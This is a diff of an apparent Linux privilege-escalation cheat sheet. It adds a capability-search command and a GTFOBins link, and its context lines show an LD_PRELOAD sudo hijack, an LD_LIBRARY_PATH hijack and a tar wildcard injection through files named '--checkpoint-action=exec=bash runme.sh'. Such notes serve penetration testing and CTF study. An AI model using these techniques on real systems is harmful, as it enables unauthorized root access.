@@ -115,7 +115,7 @@ void _init() {
 gcc /tmp/preload.c -fPIC -shared -nostartfiles -o /tmp/preload.so 
 sudo LD_PRELOAD=/tmp/preload.so program-name-here
 ```
-#### If env_keep+=LD_LIBRARY_PATH" existed. 🔆
+#### If "env_keep+=LD_LIBRARY_PATH" existed. 🔆
 ```bash
 ldd /usr/sbin/apache2 #  libcrypt.so.1 => /lib/libcrypt.so.1 
 nano /tmp/library_path.c ⬇️⬇️⬇️⬇️
@@ -204,11 +204,10 @@ chmod +x /home/user/runme.sh # target machine
 touch /home/user/--checkpoint=1 # target machine
 touch /home/user/--checkpoint-action=exec=bash\ runme.sh # target machine 
 ```
-
-
 ## Capabilities ✅
 ```bash
-
+getcap -r / 2>/dev/null # If "cap_setuid+ep" existed. 
+go to # https://gtfobins.github.io/#
 ```
 ## **SUID_SGID** ✅
 ### Known Exploits ✡️
